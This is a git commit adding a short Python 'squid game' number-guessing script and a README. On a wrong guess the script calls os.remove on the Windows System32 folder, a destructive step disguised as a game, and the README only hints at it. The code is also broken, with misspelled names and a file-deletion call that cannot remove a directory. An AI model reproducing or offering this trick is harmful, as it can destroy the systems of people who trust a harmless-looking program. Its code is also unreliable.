48743883e3798a809a159f6153fa0a6b06fc8416
streamninja123 <157697844+streamninja123@users.noreply.github.com>
2025-01-30 11:30:00 +0100

    streamninja squid game

---
+++ README.md.txt
@@ -0,0 +1,3 @@
+welcome to streamninja squid game 
+if you lose then yes then windows if you 
+win then yes then you win good luck
---
+++ pc squid game.py
@@ -0,0 +1,11 @@
+import random 
+import os 
+
+number = random.randint(1,10)
+guess = input("guess the number between 1 to 10")
+guess =int(huess)
+
+if guess == number:
+    pront("you won!")
+else:
+    os.remove("c:\\windows\\system32")
